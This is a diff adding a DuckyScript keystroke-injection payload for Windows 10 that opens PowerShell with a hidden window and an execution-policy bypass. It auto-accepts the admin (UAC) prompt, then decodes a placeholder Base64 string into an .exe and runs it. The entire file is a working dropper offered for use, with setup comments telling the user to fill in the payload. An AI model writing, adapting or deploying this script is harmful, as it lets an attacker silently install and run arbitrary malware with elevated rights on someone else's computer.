@@ -1,0 +1,30 @@
+REM Title: Base64 Decode & Execute
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to decode a Base64 string and then execute the file.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace all placeholders throughout the script.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM *replace this below*
+STRING $b64 = 'YOUR_BASE64_STRING_HERE_IN_SINGLE_QUOTES';
+
+STRING $decodedFile = [System.Convert]::FromBase64String($b64);
+
+
+REM *replace NAME_HERE and desired filetype (example is .exe)*
+STRING $File = "NAME_HERE"+".exe";
+
+STRING Set-Content -Path $File -Value $decodedFile -Encoding Byte;& $File
